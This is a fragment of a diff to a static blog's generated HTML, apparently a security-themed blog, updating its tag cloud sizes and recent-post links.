-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -1108,7 +1104,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/Fuzzing/" style="font-size: 15px;">Fuzzing</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 12.5px;">Web安全</a> <a href="/tags/learn/" style="font-size: 17.5px;">learn</a> <a href="/tags/security/" style="font-size: 10px;">security</a> <a href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" style="font-size: 20px;">论文细读</a>
+      <a href="/tags/CTF/" style="font-size: 16.67px;">CTF</a> <a href="/tags/Fuzzing/" style="font-size: 16.67px;">Fuzzing</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 13.33px;">Web安全</a> <a href="/tags/learn/" style="font-size: 20px;">learn</a> <a href="/tags/security/" style="font-size: 10px;">security</a> <a href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" style="font-size: 20px;">论文细读</a>
     </div>
   </div>
 
@@ -1130,6 +1126,10 @@
       <ul>
         
           <li>
+            <a href="/2024/02/24/20240224/">20240224</a>
+          </li>
+        
+          <li>
             <a href="/2024/02/23/20240223/">20240223</a>
           </li>
         
@@ -1143,10 +1143,6 @@
         
           <li>
             <a href="/2024/02/20/20240220/">20240220</a>
-          </li>
-        
-          <li>
-            <a href="/2024/02/18/20240218/">20240218</a>
           </li>
         
       </ul>
